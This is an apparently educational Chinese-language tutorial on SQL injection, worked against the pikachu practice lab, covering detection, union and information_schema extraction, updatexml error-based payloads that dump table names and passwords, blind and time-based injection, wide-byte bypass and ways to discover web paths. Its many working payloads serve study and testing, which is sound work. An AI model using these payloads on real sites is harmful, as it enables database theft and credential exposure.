# sql注入

## 注入总结图

![](/image/脑图/注入总结.png)

#### 1.0 原理

注入产生的原因是接受相关参数未经处理直接带入数据库查询操作

#### 1.1 攻击条件

- **确定Web应用程序所使用的技术**
  - 可以考察Web页面的页脚
  - 查看错误页面
  - 检查页面源代码
  - 使用诸如Nessus、AWVS、APPSCAN等工具来进行刺探
- **确定所有可能的输入方式**
  - HTML表单
  - 通过隐藏的HTML表单输入、HTTP头部、cookies、甚至对用户不可见的后端AJAX请求来跟Web应用进行交互M
  - HTTP的GET和POST
- **查找可以用于注射的用户输入**
  - 多留意Web应用的错误页面

#### 1.2  注入前的准备及注入漏洞检测

1. 显示友好HTTP错误信息

   - 取消IE浏览器返回信息设置，以便查看到注入攻击时返回的数据库信息
   - 打开IE浏览器，选择菜单“工具”一“Internet选项”命令，打开“Internet选项”对话框。打开“高级”选项卡，在“设置”列表框中找到“浏览组”，取消勾选“显示友好HTTP错误信息”

2. 手工检测sql注入点

   - 寻找如下形式的网页链接。（最常见）

     http://www.*****.com/***.asp?id=xx (ASP注入)

     http://www.*****.com/index.asp?id=8&page=99 

     (注:注入的时候确认是id参数还是page参数，工具默认只对后面page参数注入，所以要对工具进行配置或者手工调换) 

   - 检测方法

     - **“单引号”法**
     - **1=1和1=2法**

#### 1.3  注入分类

1. 数字型(or 1=1)

   - 通过burp抓包输入一个or 1=1设置一个payload,点击提交后，在Render中查看结果。通过判断存在SQL注入，且为数字型注入，可以通过拼接SQL语句来实现注入。

     ![](/image/sql/sql-1.png)

2. 字符型('or 1=1#')

   - 在vince后面添加单引号来闭合vince，再在1=1后面添加注释#来消除掉后面的单引号，这样来完成一个SQL语句的拼接合法性。完整的语句为select id,email from member where username='vince‘ or 1=1#'；我们回到pikachu平台输入vince‘ or 1=1#

     ![](/image/sql/sql-2.png)

3. 搜索型(%xxxx%'or 1=1 #%')

   - 将拼接语句写为%xxxx%'or 1=1 #%'

     ![](/image/sql/sql-3.png)

4. xx型(XX') or 1=1#)

   - XX型是由于SQL语句拼接方式不同

   - 拼接语句写为XX') or 1=1#

     ![](/image/sql/sql-4.png)

#### 1.4  注入提交方式

ASP：request （全部接受）、request.querystring （接受get）、request.form （接受post）、 request.cookie cookie （接受cookie）

PHP:` $_REQUEST（全部接受）`、`$_GET $_POST （接受post）`、`$_COOKIE（接受cookie）`

#### 1.5   **注入攻击类型与方式**

- union注入

  - union操作符用于合并两个或多个SQL语句集合起来，得到联合的查询结果

    **select id,email from member where username='kevin' union select username,pw from member where id=1;**

    **注：union操作符一般与order by语句配合使用**

    - 输入a' order by 3#% ，通过这个简单的办法找到主查询一共有三个字段

      ![](/image/sql/sql-5.png)

    - 之后我们来使用union来做一个SQL语句的拼接。输入构造好的语句a' union select database(),user(),version()#%

      ![](/image/sql/sql-6.png)

- information_schema注入

  - information_schema数据库是MySQL系统自带的数据库
  - 通过information_schema注入，我们可以将整个数据库内容全部窃取出来, 
    - 使用order by来判断查询的字段
    - 找出数据库的名称，输入vince' union select database(),user(),3#%
    - 获取pikachu数据库的**表名**，输入:u' union select table_schema ,table_name,3 from information_schema.tables where table_schema='pikachu'#
    - 获取pikachu数据库的**字段名**，输入： k' union select table_name,column_name,3 from information_schema.columns where table_name='users'#%
    - 最后获取**字段值**的内容，输入：kobe'union select username ,password,3 from users#%

- 基于函数的报错

  - 条件：后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端

  - **三个常用的用来报错的函数**

    - updatexml（）:函数是MYSQL对XML文档数据进行查询和修改的XPATH函数.

      1、爆数据库版本信息

      k' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #

      2、爆数据库当前用户

      k' and  updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#  

      3、爆数据库

      k' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #

      4、爆表

      获取数据库表名，输入：k'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#，但是反馈回的错误表示只能显示一行，所以采用limit来一行一行显示

      输入k' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0)#更改limit后面的数字limit 0完成表名遍历。

      5、爆字段

      获取字段名，输入：k' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit **2**,1)),0)#

      6、爆字段内容

      获取字段内容，输入：k' and  updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#

    - extractvalue（） :函数也是MYSQL对XML文档数据进行查询的XPATH函数.

    - floor（）:MYSQL中用来取整的函数.

- insert注入

  - 前端注册的信息最终会被后台通过insert这个操作插入数据库，后台在接受前端的注册数据时没有做防SQL注入的处理

  - 进入网站注册页面，填写网站注册相关信息，通过Burp抓包在用户名输入相关payload

    oldboy'or updatexml(1,concat(0x7e,(命令)),0) or'

    \1. 爆表名

    oldboy'or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0) or'

    ![img](/image/sql/wps1.jpg) 

    \2. 爆列名

    ' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 2,1)),0) or'

    ![img](/image/sql/wps2.jpg) 

    \3. 爆内容

    ' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or' 等同

    ' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or '1'='1''

- uodate注入

  - 与insert注入的方法大体相同，区别在于update用于用户登陆端，insert用于用于用户注册端

    ' or updatexml(0,concat(0x7e,(database())),0) or'

- dalete注入

  - 一般应用于前后端发贴、留言、用户等相关删除操作，点击删除按钮时可通过Brup Suite抓包，对数据包相关delete参数进行注入

    delete from message where id=56 or updatexml(2,concat(0x7e,(database())),0)

- http header注入

  - User-Agent输入payload Mozilla' or updatexml(1,concat(0x7e,database ()),0) or 'html>

- cookie注入

  - 如果后端获取Cookie后放在数据库中进行拼接，那么这也将是一个SQL注入点
  - 在 ant[uname]=admin后添加一个’观察反馈的MYSQL的语法报错，发现了存在SQL注入漏洞，在设置Payload 'and updatexml (1,concat(0x7e,database()),0)#,观察报错和之前是否相同

- 盲注(base on boolian)、盲注(base on time)

  - 布尔盲注

    - 在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。

      输入语句select ascii(substr(database(),1,1))>xx;通过对比ascii码的长度，判断出数据库表名的第一个字符。

      **注: substr()函数**

      string(必需)规定要返回其中一部分的字符串。start(必需)规定在字符串的何处开始。length(可选)规定被返回字符串的长度。

    - 在实际操作中通常不会使用手动盲注的办法，可以使用sqlmap等工具来增加盲注的效率。

  - 时间盲注

    - payload: vince' and sleep(x)#

    - vince' and if(substr(database(),1,1)='X' (猜测点)',sleep(10),null#

      输入后，如果猜测真确，那么就会响应10秒，如果错误会立刻返回错误。

    - 输入：vince' and if(substr(database(),1,1)='p',sleep(10),null)#

      在web控制台下，判断出database的表名的一个字符为p

- 宽字节注入

  - 当我们把php.ini文件里面的magic_quotes_gqc参数设为ON时，所有的'（单引号），"(双引号)，\(反斜杠)和null字符都会被自动加上一个反斜杠进行转义。还有很多函数有类似的作用如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全，很多漏洞查找者或者工具遇到这些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。

    其中\的十六进制是 %5C ，当我们在单引号前面加上%df的时候，最终就会变成 運'，如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK的编码时，会认为 %df 是一个宽字符，也就是運，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。

    ' =======>\'单引号转义后占两个字节，所以我们需要通过繁体字%df构造两个字节,最终用運干掉了\，也就是说被運占领了\ 所以最后在页面也不会显示出来.

  - **哪些地方没有魔术引号的保护？**

    （1） $_SERVER 变量

      PHP5的$_SERVER变量缺少magic_quotes_gqc的保护，导致近年来X-Forwarded-For的漏洞猛爆，所以很多程序员考虑过滤X-Forwarded-For，但是其它的变量呢？

    （2）getenv()得到的变量（使用类似$_SERVER 变量）

    （3）$HTTP_RAW_POST_DATA与PHP输入、输出流

1. 内置变量爆数据库类型

   “User”是SQL Server的一个内置变量，它的值是当前连接的用户名，其变量类型为“nvarchar"字符型

   方法：在注入点之后提交   and user>0

   错误信息：

   ​	Microsoft OLE DB Provider for SQL Server 错误'80040e21'（MS SQL数据库）

   ​	将nvarchar值''转换为数据类型为int的列时发生语法错误。（Access数据库）

#### 1.6实战

 access 数据库<https://www.jianshu.com/p/fc1e26d3ad45>

mysql 数据库<https://www.jianshu.com/p/f98ab1b4b12e>

#### 1.7**获取Web路径**

(1)一般可以在变量后面加上单引号、改变参数类型、增加参数位数等来造成MySQL数据库出错，爆出Web物理路径。

（2）通过扫描器扫web服务器遗留文件 php.php、info.php、phpinfo.php、test.php

（3）利用搜索引擎来查找Web目录。搜索引擎有时候会对网站页面进行快照抓取，包括脚本出错页面，因此可利用搜索引擎查找网站的出错信息，从而获得网站的物理路径。可在Google或百度中搜索“mysql site:***.com”或“warning site:***.com,error site:***.com.cn”等。

这里使用“error site:***.com”关键字进行查询，从搜索结果中得到了网站的物理路径为“E:\pujing2015”。

(4) 漏洞暴路径，例如通过网站后台查看网站Web路径、CC攻击暴路径等.

(6)通过配置文件找网站路径,在百度里面输入***配置文件,如:IIS6.0配置文件，可以找到: C:\\WINDOWS\\system32\\inetsrv\\MetaBase.xml 和C:\WINDOWS\system32\inetsrv\MetaBase.bin 这两个配置文件（小技巧:在百度里面输入:load_file()常用敏感信息，就可以找到别人入侵过程中总结的常用敏感文件路径）。



























